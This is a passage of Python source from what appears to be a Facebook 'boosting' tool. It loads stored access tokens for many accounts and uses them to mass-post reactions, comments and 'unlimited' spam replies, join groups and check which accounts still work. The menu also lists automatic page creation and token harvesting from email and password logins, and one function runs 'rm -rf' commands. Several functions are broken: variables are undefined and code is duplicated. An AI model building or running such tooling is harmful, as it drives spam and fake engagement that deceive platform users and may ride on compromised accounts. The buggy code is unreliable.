        profile_name = get_profile_username(profile_id, access_token)
        if remove_follower(profile_id, access_token):
            print(f"{GREEN}SUCCESS : REMOVED THE FOLLOWER FROM PROFILE '{profile_name}' WITH ID {i + 1}")
            remove_count += 1
        else:
            print(f"{red}FAILED : COULD NOT REMOVE THE FOLLOWER FROM PROFILE '{profile_name}' WITH ID {i + 1}")
    print(f"{GREEN}SUCCESSFULLY REMOVED {remove_count} FOLLOWERS.")

def Video_Extractid(url):
    match = re.search(r'/(videos|photos)/(\d+)', url)
    return match.group(2) if match else None

def load_data(filepath):
    try:
        with open(filepath, 'r') as file:
            return [line.strip() for line in file.readlines()]
    except Exception as e:
        print(f"FAILED TO LOAD DATA: {e}")
        return []

def has_reacted(media_id, access_token):
    return False

def perform_reaction_media(url, reaction_type, num_reactions):
    media_id = Video_Extractid(url)
    if not media_id:
        print("INVALID URL OR UNABLE TO EXTRACT MEDIA ID.")
        return
    access_tokens = load_data('/sdcard/ARTHUR-RPW-BOOSTING/toka.txt')
    reactions_count = 0
    for access_token in access_tokens:
        if access_token.startswith("EA") or access_token.startswith("EAA"):
            try:
                if not has_reacted(media_id, access_token):
                    url = f'https://graph.facebook.com/v18.0/{media_id}/reactions'
                    params = {'access_token': access_token, 'type': reaction_type}
                    response = requests.post(url, params=params)
                    if response.status_code == 200:
                        reactions_count += 1
                        print(f"{GREEN}SUCCESS : REACTED WITH '{reaction_type}' ON MEDIA ID '{media_id}'. RESPONSE: {response.json()}")
                        if reactions_count >= num_reactions:
                            print(f"REACHED THE LIMIT OF {num_reactions} REACTIONS.")
                            return
                    else:
                        print(f"{red}FAILED : TO POST REACTION ON MEDIA ID '{media_id}'. RESPONSE: {response.json()}")
            except requests.exceptions.RequestException as error:
                print(f"AN ERROR OCCURRED DURING THE REQUEST: {error}")
            except Exception as e:
                print(f"AN UNEXPECTED ERROR OCCURRED: {e}")
    print(f"TOTAL REACTIONS SENT : {reactions_count}")

def auto_working_vid():
    clearr()
    url = input("ENTER THE MEDIA URL : ")
    reaction_type = input("ENTER THE REACTION TYPE (LIKE, LOVE, WOW, ETC.) : ")
    num_reactions = int(input("ENTER THE NUMBER OF REACTIONS TO PERFOR : "))
    perform_reaction_media(url, reaction_type, num_reactions)

def get_tokens_from_file(file_path):
    with open(file_path, 'r') as file:
        return [line.strip() for line in file]

def get_profile_id(access_token):
    try:
        url = 'https://graph.facebook.com/me'
        params = {'access_token': access_token}
        response = requests.get(url, params=params)
        if response.status_code == 200:
            return response.json().get('id')
        else:
            return None
    except requests.exceptions.RequestException:
        return None

def join_group(group_id, profile_id, access_token):
    try:
        url = f'https://graph.facebook.com/{group_id}/members/{profile_id}'
        params = {'access_token': access_token},
        response = requests.post(url, params=params)
        if response.status_code == 200:
            return True
        else:
            return False
    except requests.exceptions.RequestException:
        return False

def extract_group_id(input_value):
    match = re.search(r'/groups/(\d+)', input_value)
    if match:
        return match.group(1)
    return input_value

def auto_group_join(group_id, num_bots):
    access_tokens = get_tokens_from_file('/sdcard/ARTHUR-RPW-BOOSTING/toka.txt')
    join_count = 0
    failed_count = 0
    for access_token in access_tokens:
        if join_count >= num_bots:
            break
        if access_token.startswith("EA") or access_token.startswith("EAA"):
            profile_id = get_profile_id(access_token)
            if profile_id:
                success = join_group(group_id, profile_id, access_token)
                if success:
                    print(f"{GREEN}SUCCESS : GROUP ID {group_id}, USER ID {profile_id}")
                    join_count += 1
                else:
                    print(f"{red}FAILED : GROUP ID {group_id}, USER ID {profile_id}")
                    failed_count += 1
            else:
                print(f"{red}FAILED : INVALID PROFILE ID FOR TOKEN.")
                failed_count += 1
        else:
            print("{red}FAILED : INVALID ACCESS TOKEN FORMAT")
            failed_count += 1
        time.sleep(1)
    print(f"\n{GREEN}SUCCESSFULLY JOINED {join_count} ACCOUNTS TO THE GROUP.")
    print(f"{red}FAILED TO JOIN {failed_count} ACCOUNTS.")

def join_groupp():
    clearr()
    group_input = input("ENTER THE FACEBOOK GROUP LINK OR ID : ")
    group_id = extract_group_id(group_input)
    num_bots = int(input("ENTER THE NUMBER OF PROFILES TO JOIN : "))
    auto_group_join(group_id, num_bots)

def get_ids_tokens(file_path):
    with open(file_path, 'r') as file:
        return [line.strip() for line in file.readlines()]

def extract_reel_id(reels_link):
    match = re.search(r'reel/(\d+)', reels_link)
    if match:
        return match.group(1)
    else:
        print("INVALID REEL LINK FORMAT!")
        return None

def auto_comment_on_reels(reels_link, comments, num_comments, tokens):
    reel_id = extract_reel_id(reels_link)
    if not reel_id:
        return
    url = f'https://graph.facebook.com/v13.0/{reel_id}/comments'
    total_successful_comments = 0
    total_failed_comments = 0
    token_index = 0
    comment_index = 0
    available_tokens = len(tokens)
    if num_comments > available_tokens * len(comments):
        print(f"REQUESTED {num_comments} COMMENTS, BUT ONLY {available_tokens * len(comments)} COMMENTS ARE POSSIBLE WITH AVAILABLE TOKENS.")
        num_comments = available_tokens * len(comments)
    while total_successful_comments < num_comments:
        for _ in range(available_tokens):
            if total_successful_comments >= num_comments:
                break
            current_token = tokens[token_index % available_tokens]
            current_comment = comments[comment_index % len(comments)]
            if current_token.startswith("EA") or current_token.startswith("EAA"):
                params = {'access_token': current_token, 'message': current_comment}
                try:
                    response = requests.post(url, params=params)
                    if response.status_code == 200:
                        total_successful_comments += 1
                        print(f"{GREEN}COMMENT : '{current_comment}' THEN SUCCESSFULLY TOKEN {current_token[:10]}... ({total_successful_comments}/{num_comments})")
                        comment_index += 1
                    else:
                        total_failed_comments += 1
                        error_message = response.json().get("error", {}).get("message", "Unknown error")
                        print(f"{red}FAILED COMMENT : '{current_comment}' WITH TOKEN {current_token[:10]}... STATUS CODE : {response.status_code} - ERROR : {error_message}")
                except requests.exceptions.RequestException as e:
                    print(f"REQUEST FAILED WITH TOKEN {current_token[:10]}... ERROR : {e}")
                    total_failed_comments += 1
            else:
                print(f"INVALID TOKEN FORMAT : {current_token[:10]}...")
            token_index += 1
        if token_index >= available_tokens:
            token_index = 0
    print(f'{GREEN}TOTAL SUCCESSFULLY COMMENTS : {total_successful_comments}')
    print(f'{red}TOTAL FAILED COMMENTS : {total_failed_comments}')

def auto_comments_reels():
    clear()
    print(f"{WHITE}「1」AUTO COMMENT WITH THE SAME COMMENT")
    print(f"{WHITE}「2」AUTO COMMENT WITH DIFFERENT COMMENTS")
    linex()
    me = input(f'{WHITE}「Choose」 : ')
    if me == '1':
        comment_reels_1()
    elif me == '2':
    	comment_reels_2()
    else:
        print(f'{red}INVALID OPTION.')

def comment_reels_1():
	clearr()
	reels_link = input("ENTER THE REEL LINK : ")
	comment = input("ENTER THE COMMENT : ")
	num_comments = int(input("ENTER THE NUMBER OF COMMENTS TO SEND : "))
	tokens = get_ids_tokens('/sdcard/ARTHUR-RPW-BOOSTING/toka.txt')
	if len(tokens) == 0:
		print("NO TOKENS FOUND. PLEASE ADD TOKENS TO THE FILE.")
		return
	auto_comment_on_reels(reels_link, [comment], num_comments, tokens)

def comment_reels_2():
	clearr()
	reels_link = input("ENTER THE REEL LINK : ")
	num_comments = int(input("ENTER THE NUMBER OF COMMENTS TO SEND : "))
	comments = []
	for i in range(num_comments):
		comment = input(f"ENTER COMMENT {i + 1}: ")
		comments.append(comment)
	tokens = get_ids_tokens('/sdcard/ARTHUR-RPW-BOOSTING/toka.txt')
	if len(tokens) == 0:
		print("NO TOKENS FOUND. PLEASE ADD TOKENS TO THE FILE.")
		return

lock = threading.Lock()

def get_ids_tokens(file_path):
    with open(file_path, 'r') as file:
        return [line.strip() for line in file.readlines()]

def extract_reel_id(reels_link):
    match = re.search(r'reel/(\d+)', reels_link)
    if match:
        return match.group(1)
    else:
        print("INVALID REEL LINK FORMAT!")
        return None

def auto_react_to_reels_fast(reels_link, reaction_type, num_reactions, tokens):
    reel_id = extract_reel_id(reels_link)
    if not reel_id:
        return
    url = f'https://graph.facebook.com/v13.0/{reel_id}/reactions'
    total_successful_reactions = 0

    def react_with_token(access_token):
        nonlocal total_successful_reactions
        with lock:
            if total_successful_reactions >= num_reactions:
                return 0
        if access_token.startswith("EA") or access_token.startswith("EAA"):
            params = {'access_token': access_token, 'type': reaction_type}
            try:
                response = requests.post(url, params=params)
                if response.status_code == 200:
                    with lock:
                        if total_successful_reactions < num_reactions:
                            total_successful_reactions += 1
                            print(f"{GREEN}SUCCESS REACTION WITH TOKEN {access_token[:10]}... ({total_successful_reactions}/{num_reactions})")
                    return 1
                else:
                    print(f"{red}FAILED REACTION WITH TOKEN {access_token[:10]}... STATUS CODE : {response.status_code}")
                    return 0
            except requests.exceptions.RequestException as e:
                print(f"REQUEST FAILED WITH TOKEN {access_token[:10]}... ERROR : {e}")
                return 0
        return 0
    available_tokens = len(tokens)
    if num_reactions > available_tokens:
        print(f"REQUESTED {num_reactions} REACTIONS, BUT ONLY {available_tokens} TOKENS ARE AVAILABLE.")
        num_reactions = available_tokens
    total_failed_reactions = 0
    with ThreadPoolExecutor(max_workers=1) as executor:
        future_to_token = {executor.submit(react_with_token, token): token for token in tokens}
        for future in as_completed(future_to_token):
            with lock:
                if total_successful_reactions >= num_reactions:
                    break
            successful_reaction = future.result()
            if not successful_reaction:
                total_failed_reactions += 1
    print(f'{GREEN}TOTAL SUCCESSFULLY REACTIONS : {total_successful_reactions}')
    print(f'{red}TOTAL FAILED REACTIONS : {total_failed_reactions}')

def auto_reacts_reels():
    clearr()
    print(f"{WHITE}「1」AUTO REACTING TO REELS")
    linex()
    me = input(f'{WHITE}「Choose」 : ')
    if me == '1':
        reacts_to_reels1()
    else:
        print(f'{red}INVALID OPTION.')

def reacts_to_reels1():
	clearr()
	reels_link = input("ENTER THE REEL LINK : ")
	reaction_type = input("ENTER THE REACTION TYPE (E.G. LIKE, LOVE): ")
	num_reactions = int(input("ENTER THE NUMBER OF REACTIONS TO SEND : "))
	tokens = get_ids_tokens('/sdcard/ARTHUR-RPW-BOOSTING/toka.txt')
	if len(tokens) == 0:
		print("NO TOKENS FOUND. PLEASE ADD TOKENS TO THE FILE.")
		return
	auto_react_to_reels_fast(reels_link, reaction_type, num_reactions, tokens)

def Video_Extractid(url):
    match = re.search(r'/(videos|photos)/(\d+)', url)
    return match.group(2) if match else None

def load_data(filepath):
    try:
        with open(filepath, 'r') as file:
            return [line.strip() for line in file.readlines()]
    except Exception as e:
        print(f"FAILED TO LOAD DATA: {e}")
        return []

def validate_access_token(access_token):
    validation_url = f"https://graph.facebook.com/debug_token?input_token={access_token}&access_token={access_token}"
    response = requests.get(validation_url)
    if response.status_code == 200:
        data = response.json().get("data", {})
        if data.get("is_valid"):
            return True
        else:
            print(f"ACCESS TOKEN IS INVALID: {data}")
            return False
    else:
        print(f"FAILED TO VALIDATE ACCESS TOKEN. RESPONSE: {response.json()}")
        return False

def perform_comment(media_id, comment_text, access_token):
    try:
        url = f'https://graph.facebook.com/v18.0/{media_id}/comments'
        params = {'access_token': access_token, 'message': comment_text}
        response = requests.post(url, params=params)
        if response.status_code == 200:
            print(f"{GREEN}SUCCESS : COMMENTED '{comment_text}' ON MEDIA ID '{media_id}'.")
            return True
        else:
            error_data = response.json()
            if error_data['error']['code'] == 190 and error_data['error'].get('error_subcode') == 490:
                print(f"{red}CHECKPOINT REQUIRED FOR THIS ACCOUNT. TOKEN: {access_token[:10]}... SKIPPING THIS TOKEN.")
                return False
            else:
                print(f"{red}FAILED TO POST COMMENT ON MEDIA ID '{media_id}'. RESPONSE: {error_data}")
                return False
    except requests.exceptions.RequestException as error:
        print(f"AN ERROR OCCURRED DURING THE REQUEST: {error}")
        return False

def post_different_comments(url, num_comments):
    media_id = Video_Extractid(url)
    if not media_id:
        print("INVALID URL OR UNABLE TO EXTRACT MEDIA ID.")
        return
    access_tokens = load_data('/sdcard/ARTHUR-RPW-BOOSTING/toka.txt')
    comments = []
    for i in range(num_comments):
        comment = input(f"ENTER COMMENT {i + 1}: ")
        comments.append(comment)
    comment_count = 0
    while comment_count < num_comments:
        for access_token in access_tokens:
            if validate_access_token(access_token):
                comment_text = comments[comment_count]
                if perform_comment(media_id, comment_text, access_token):
                    comment_count += 1
                if comment_count >= num_comments:
                    print(f"REACHED THE LIMIT OF {num_comments} COMMENTS.")
                    return
            else:
                print(f"SKIP SKIPPING INVALID ACCESS TOKEN: {access_token[:10]}...")
    print(f"TOTAL DIFFERENT COMMENTS POSTED: {comment_count}")

def auto_comments_vids():
    clearr()
    print(f"{WHITE}「1」POST THE SAME COMMENTS")
    print(f"{WHITE}「2」POST DIFFERENT COMMENTS")
    linex()
    me = input(f'{WHITE}「Choose」 : ')
    if me == '1':
        comment_post_reels_1()
    elif me == '2':
    	comment_post_reels_2()
    else:
        print(f'{red}INVALID OPTION.')

def comment_post_reels_1():
	clear()
	comment_text = input("ENTER THE COMMENT TEXT : ")
	num_comments = int(input("ENTER THE NUMBER OF COMMENTS TO POST : "))
	post_same_comment(url, comment_text, num_comments)

def comment_post_reels_2():
	clear()
	num_comments = int(input("ENTER THE NUMBER OF COMMENTS TO POST: "))
	post_different_comments(url, num_comments)

def get_ids_tokens(file_path):
    with open(file_path, 'r') as file:
        return [line.strip() for line in file]

def extract_comment_id_from_url(url):
    match = re.search(r'comment_id=(\d+)', url)
    if match:
        return match.group(1)
    else:
        return None

def reply_to_comment_on_facebook(same_replies, num_replies):
    clearr()
    user_ids = get_ids_tokens('/sdcard/ARTHUR-RPW-BOOSTING/tokaid.txt')
    access_tokens = get_ids_tokens('/sdcard/ARTHUR-RPW-BOOSTING/toka.txt')
    input_url = input('ENTER THE COMMENT ID OR FULL URL TO REPLY TO : ')
    comment_id = extract_comment_id_from_url(input_url) if 'comment_id=' in input_url else input_url
    if not comment_id:
        print("INVALID URL OR COMMENT ID.")
        return
    if same_replies:
        reply_text = input('ENTER THE REPLY TEXT (FOR ALL REPLIES): ')
    else:
        reply_texts = [input(f'ENTER REPLY TEXT {i + 1}: ') for i in range(num_replies)]
    replies_count = 0
    reply_index = 0
    for i in range(len(user_ids)):
        if replies_count >= num_replies:
            print(f"{GREEN}SUCCESSFULLY MADE {num_replies} REPLIES.")
            return
        user_id = user_ids[i]
        access_token = access_tokens[i]
        try:
            if same_replies:
                text_to_use = reply_text
            else:
                text_to_use = reply_texts[reply_index % len(reply_texts)]
                reply_index += 1
            url = f'https://graph.facebook.com/v19.0/{comment_id}/comments'
            params = {'access_token': access_token, 'message': text_to_use}
            response = requests.post(url, params=params)
            if response.status_code == 200:
                replies_count += 1
                print(f"{GREEN}SUCCESSFULLY REPLIED TO COMMENT {comment_id} WITH REPLY: {text_to_use}")
            else:
                print(f"{red}FAILED TO REPLY TO COMMENT {comment_id} WITH REPLY: {text_to_use}")
            time.sleep(1)
        except requests.exceptions.RequestException as error:
            print(f"{red}FAILED TO REPLY TO COMMENT {comment_id} WITH REPLY: {text_to_use}")
    if replies_count < num_replies:
        print(f"ONLY {replies_count} REPLIES WERE MADE.")

def auto_spam_comments(same_replies):
    clearr()
    user_ids = get_ids_tokens('/sdcard/ARTHUR-RPW-BOOSTING/tokaid.txt')
    access_tokens = get_ids_tokens('/sdcard/ARTHUR-RPW-BOOSTING/toka.txt')
    input_url = input('ENTER THE COMMENT ID OR FULL URL TO SPAM : ')
    comment_id = extract_comment_id_from_url(input_url) if 'comment_id=' in input_url else input_url
    if not comment_id:
        print("INVALID URL OR COMMENT ID.")
        return
    num_replies = int(input('ENTER THE NUMBER OF REPLIES TO SEND: '))
    if same_replies:
        reply_text = input('ENTER THE SPAM COMMENT TEXT (FOR ALL REPLIES): ')
    else:
        reply_texts = [input(f'ENTER REPLY TEXT {i + 1}: ') for i in range(num_replies)]
    spam_count = 0
    reply_index = 0
    while spam_count < num_replies:
        for i in range(len(user_ids)):
            user_id = user_ids[i]
            access_token = access_tokens[i]
            try:
                if same_replies:
                    text_to_use = reply_text
                else:
                    text_to_use = reply_texts[reply_index % len(reply_texts)]
                    reply_index += 1
                url = f'https://graph.facebook.com/v19.0/{comment_id}/comments'
                params = {'access_token': access_token, 'message': text_to_use}
                response = requests.post(url, params=params)
                if response.status_code == 200:
                    spam_count += 1
                    print(f"{GREEN}SPAM COMMENT {spam_count} SUCCESSFULLY POSTED: {text_to_use}")
                else:
                    print(f"{red}FAILED TO SPAM COMMENT {comment_id} WITH REPLY: {text_to_use}")
                time.sleep(1)
                if spam_count >= num_replies:
                    break
            except requests.exceptions.RequestException as error:
                print(f"{red}FAILED TO SPAM COMMENT {comment_id} WITH REPLY: {text_to_use}")
    print(f"STOPPED AFTER {spam_count} SPAM COMMENTS.")

def auto_reply_to_comments():
    clearr()
    print(f"{WHITE}「1」REPLY TO A COMMENT ON FACEBOOK")
    print(f"{WHITE}「2」AUTO SPAM COMMENTS UNLIMITED")
    linex()
    me = input(f'{WHITE}「Choose」 : ')
    if me == '1':
        auto_reply_comments1()
    elif me == '2':
        auto_spam_comments2()
    else:
        print(f'{red}INVALID OPTION.')

def auto_reply_comments1():
	clearr()
	print(f"{WHITE}「1」SAME REPLIES")
	print(f"{WHITE}「2」DIFFERENT REPLIES")
	linex()
	me = input(f'{WHITE}「Choose」 : ')
	if reply_type == '1':
		num_replies = int(input('ENTER THE NUMBER OF REPLIES TO MAKE : '))
		reply_to_comment_on_facebook(same_replies=True, num_replies=num_replies)
	elif reply_type == '2':
		num_replies = int(input('ENTER THE NUMBER OF REPLIES TO MAKE : '))
		reply_to_comment_on_facebook(same_replies=True, num_replies=num_replies)
	else:
		print(f'{red}INVALID OPTION.')

def auto_spam_comments2():
	clearr()
	print(f"{WHITE}「1」SAME REPLIES")
	print(f"{WHITE}「2」DIFFERENT REPLIES")
	linex()
	me = input(f'{WHITE}「Choose」 : ')
	if reply_type == '1':
		num_replies = int(input('ENTER THE NUMBER OF REPLIES TO MAKE : '))
		auto_spam_comments(same_replies=True, num_replies=num_replies)
	elif reply_type == '2':
		num_replies = int(input('ENTER THE NUMBER OF REPLIES TO MAKE : '))
		auto_spam_comments(same_replies=True, num_replies=num_replies)
	else:
		print(f'{red}INVALID OPTION.')

COLORS = {
    'bold_red': "\033[1;31m",
    'bold_green': "\033[1;32m",
    'bold_yellow': "\033[1;33m",
    'bold_cyan': "\033[1;36m",
    'reset': "\033[0m"
}

def get_ids_tokens(file_path):
    with open(file_path, 'r') as file:
        return [line.strip() for line in file]

def save_valid_data(file_path, valid_data):
    with open(file_path, 'w') as file:
        for line in valid_data:
            file.write(line + '\n')

def check_token_validity(token):
    url = "https://graph.facebook.com/me"
    params = {'access_token': token, 'fields': 'id'}
    try:
        response = requests.get(url, params=params, timeout=5)
        if response.status_code == 200:
            print(f"{COLORS['bold_green']}VALID TOKEN: {token}{COLORS['reset']}")
            return True, None
        else:
            error_message = response.json().get('error', {}).get('message', 'Unknown error')
            print(f"{COLORS['bold_red']}INVALID TOKEN: {token}{COLORS['reset']} | "
                  f"{COLORS['bold_cyan']}REASON: {error_message}{COLORS['reset']}")
            return False, error_message
    except requests.RequestException as e:
        print(f"{COLORS['bold_red']}ERROR CHECKING TOKEN: {token}{COLORS['reset']} | "
              f"{COLORS['bold_cyan']}REASON: {str(e)}{COLORS['reset']}")
        return False, str(e)

def validate_and_remove_invalid(ids_file, tokens_file):
    ids = get_ids_tokens(ids_file)
    tokens = get_ids_tokens(tokens_file)
    valid_ids = []
    valid_tokens = []
    for token, actor_id in zip(tokens, ids):
        print(f"{COLORS['bold_yellow']}CHECKING TOKEN FOR ID: {actor_id}{COLORS['reset']}")
        is_valid, reason = check_token_validity(token)
        if is_valid:
            valid_ids.append(actor_id)
            valid_tokens.append(token)
        else:
            print(f"{COLORS['bold_red']}REMOVING INVALID TOKEN AND ID: {actor_id} - {token}{COLORS['reset']}")
    save_valid_data(ids_file, valid_ids)
    save_valid_data(tokens_file, valid_tokens)

def acc_checker():
	ids_file_path = '/sdcard/ARTHUR-RPW-BOOSTING/tokaid.txt'
	tokens_file_path = '/sdcard/ARTHUR-RPW-BOOSTING/toka.txt'
	validate_and_remove_invalid(ids_file_path, tokens_file_path)

def updated():
    git_pull_repository()

headers_global = {
    'user-agent': W_ueragnt(),
    'viewport-width': '576'}
speed = 100
allcookie = []
s_react = []
s_comment = []
s_flw = []
logos = logo


def reset():
    folder_name = "ARTHUR-RPW-BOOSTING"
    file_names = ["toka.txt", "tokaid.txt", "tokp.txt", "tokpid.txt", "tokfra.json", "tokrpw.json", "cok.txt", "cokid.txt"]
    if os.path.exists(folder_name):
        for root, dirs, files in os.walk(folder_name, topdown=False):
            for name in files:
                file_path = os.path.join(root, name)
                os.remove(file_path)
            for name in dirs:
                dir_path = os.path.join(root, name)
                os.rmdir(dir_path)
        os.rmdir(folder_name)
        print(f"{GREEN}SUCCESSFULLY RESET.{r}")
    else:
        print(f"{red}FAILED TO RESET.")

def menu():
    clearr()
    clr()
    print(f'{magenta}╭────────────────────────────────────────────────────────────╮{wh}')
    print(f'''{magenta}│{YELLOW}「01」{cyan}START TOOL               {magenta}-  {BLACK}「Page & Normal Account」 {magenta}│''')
    print(f'''{magenta}│{YELLOW}「02」{GREEN}AUTO REACT W/O CARE      {magenta}-  {BLACK}「Page & Normal Account」 {magenta}│''')
    print(f'''{magenta}│{YELLOW}「03」{GREEN}AUTO COMMENT             {magenta}-  {BLACK}「Normal Account Only」   {magenta}│''')
    print(f'''{magenta}│{YELLOW}「04」{GREEN}AUTO REPLY TO COMMENT    {magenta}-  {BLACK}「Page & Normal Account」 {magenta}│''')
    print(f'''{magenta}│{YELLOW}「05」{GREEN}AUTO REACT TO REELS      {magenta}-  {BLACK}「Page & Normal Account」 {magenta}│''')
    print(f'''{magenta}│{YELLOW}「06」{GREEN}AUTO REACT TO VIDEO      {magenta}-  {BLACK}「Page & Normal Account」 {magenta}│''')
    print(f'''{magenta}│{YELLOW}「07」{GREEN}AUTO FOLLOW              {magenta}-  {BLACK}「Page & Normal Account」 {magenta}│''')
    print(f'''{magenta}│{YELLOW}「08」{GREEN}AUTO REACT TO COMMENT    {magenta}-  {BLACK}「Page & Normal Account」 {magenta}│''')
    print(f'''{magenta}│{YELLOW}「09」{GREEN}AUTO COMMENT TO VIDEOS   {magenta}-  {BLACK}「Page & Normal Account」 {magenta}│''')
    print(f'''{magenta}│{YELLOW}「10」{GREEN}AUTO SHARE               {magenta}-  {BLACK}「Normal Account Only」   {magenta}│''')
    print(f'''{magenta}│{YELLOW}「11」{GREEN}AUTO GROUP JOIN          {magenta}-  {BLACK}「Facebook Page Only」    {magenta}│''')
    print(f'''{magenta}│{YELLOW}「12」{GREEN}AUTO CREATE PAGE         {magenta}-  {BLACK}「Page & Normal Account」 {magenta}│''')
    print(f'''{magenta}│{YELLOW}「13」{GREEN}AUTO CREATE PAGE 1       {magenta}-  {BLACK}「Page & Normal Account」 {magenta}│''')
    print(f'''{magenta}│{YELLOW}「14」{GREEN}AUTO SHARE 1             {magenta}-  {BLACK}「Normal Account Only」   {magenta}│''')
    print(f'''{magenta}│{YELLOW}「15」{GREEN}AUTO COOKIE/TOKEN                                     {magenta}│''')
    print(f'''{magenta}│{YELLOW}「16」{GREEN}AUTO REMOVE DEAD ACCOUNTS                             {magenta}│''')
    print(f'''{magenta}│{YELLOW}「17」{GREEN}UPDATED TOOL                                          {magenta}│''')
    print(f'''{magenta}│{YELLOW}「18」{red}REMOVE SPECIFIC STORE PAGES AND ACCOUNT               {magenta}│''')
    print(f'''{magenta}│{YELLOW}「19」{cyan}RESET TOOL                                            {magenta}│''')
    print(f'''{magenta}│{YELLOW}「00」{red}EXIT                                                  {magenta}│''')
    print(f'{magenta}╰────────────────────────────────────────────────────────────╯{wh}')
    choice = input(f'''{WHITE}「Choose」 : ''').upper()
    if choice == '1' or choice == '01':
        start_tool()
        return None
    if choice == '2' or choice == '02':
        quickreact()
        return None
    if choice == '3' or choice == '03':
        auto_comments()
        return None
    if choice == '4' or choice == '04':
        auto_reply_to_comments()
        return None
    if choice == '5' or choice == '05':
        auto_comments_reels()
        return None
    if choice == '6' or choice == '06':
        auto_comments_vids()
        return None
    if choice == '7' or choice == '07':
        follow()
        return None
    if choice == '8' or choice == '08':
        auto_reacts_reels()
        return None
    if choice == '9' or choice == '09':
        auto_working_vid()
        return None
    if choice == '10':
        spam_share()
        return None
    if choice == '11':
        join_groupp()
        return None
    if choice == '12':
        create_page()
        return None
    if choice == '13':
        create_page1()
        return None
    if choice == '14':
        spam_share_post()
        return None
    if choice == '15':
        email_pass_acc()
        return None
    if choice == '16':
        acc_checker()
        return None
    if choice == '17':
        updated()
        return None
    if choice == '18':
        delete_line(path_file, check_path)
    if choice == '19':
        reset()
        return None
    if choice == '20':
        print(f'''\n{red}BYEEEEEEEEE!''')
        return None
    else:
        print(f'''{red}INVALID CHOICE.''')
        return None

def NOTICE():
    os.system('rm -rf /sdcard/.ARTHUR-BOOSTING')
    os.system('rm -rf .xyz;touch .xyz')
    os.system('rm -rf /sdcard/.CdDc')
    yy = open('/sdcard/.XV', 'r').read()
    clear()
    print(f'{magenta}╭────────────────────────────────────────────────────────────╮')
    print(f'{magenta}│{WHITE}            ARTHUR BOOSTING TOOL                               {magenta}│')
    print(f'{magenta}│{WHITE}            POGI SI ARTHUR KEITH GRAYSON💥💚              {magenta}│')
    print(f'{magenta}╰────────────────────────────────────────────────────────────╯')
    print()
    input(f'{WHITE}ENTER TO RUN!')
    o = open('/sdcard/.XV', 'a')
    o.write('hindi ko alam mona talaga ba kami mo putangina sa boosting pala')

#GC()
#lNOTICE()
menu()
